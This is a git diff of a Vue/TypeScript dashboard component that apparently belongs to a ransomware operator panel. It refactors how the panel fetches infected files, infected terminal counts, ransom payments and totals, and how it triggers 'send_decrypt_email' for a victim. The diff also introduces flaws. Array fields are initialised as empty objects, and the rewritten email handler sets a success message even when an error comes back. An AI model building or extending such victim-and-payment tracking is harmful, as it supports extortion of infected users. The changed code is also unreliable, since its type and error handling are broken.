@@ -55,6 +55,9 @@ import {isAdmin, isLogged, isTokenExpired} from '../core/services/utils/auth';
 import FlashMessage from "../components/FlashMessage.vue";
 import PaymentStat from "../components/stats/PaymentStat.vue";
 import InfectedFileStat from "../components/stats/InfectedFileStat.vue";
+import { Transaction } from '../core/models/transaction';
+import {IndexResponse} from "../core/models/indexResponse";
+import { Log } from '../core/models/log';
 
 export default defineComponent({
     name: 'Home',
@@ -62,8 +65,8 @@ export default defineComponent({
         return {
             error: null as string | null,
             token: isLogged(),
-            infectedFiles: [] as any[],
-            payments: [] as any[],
+            infectedFiles: {} as Log[],
+            payments: {} as Transaction[],
             infectedTerminals: 0,
             totalAmount: 0,
             email: {
@@ -80,31 +83,26 @@ export default defineComponent({
     },
     methods: {
         call(token: string | null): void {
-            HttpRequest.get('/api/logs', token)
-                .then((response: any) => {
-                    this.payments = response.data.transactions
-                    this.infectedFiles = response.data.logs
-                    this.infectedTerminals = response.data.infectedTerminals
-                    this.totalAmount = response.data.totalAmount
-                    if([400, 404].includes(response.data.status_code)) {
-                        this.$router.push('/*')
-                    }
-                })
-                .catch((error: any) => {
-                    this.error = error;
-                });
+            HttpRequest.fetchAllLogs('/api/logs', token).then((data) => {
+                this.payments = data.transactions
+                this.infectedFiles = data.logs
+                this.infectedTerminals = data.infectedTerminals
+                this.totalAmount = data.totalAmount
+            }).catch((error: any) => {
+                this.error = error;
+            });
+
         },
         sendEmail(id: number) {
             HttpRequest.get('/api/send_decrypt_email/'+id, this.token)
                 .then((res) => {
-                    if(res.data.error) {
-                        this.email.error = res.data.message;
-                    } else {
-                        this.email.message = res.data.message
+                    if(res.error) {
+                        this.email.error = res.message;
                     }
+                    this.email.message = res.message
                 }).catch((error) => {
-                this.email.error = error;
-            });
+                    this.email.error = error;
+                });
         }
     },
     created() {
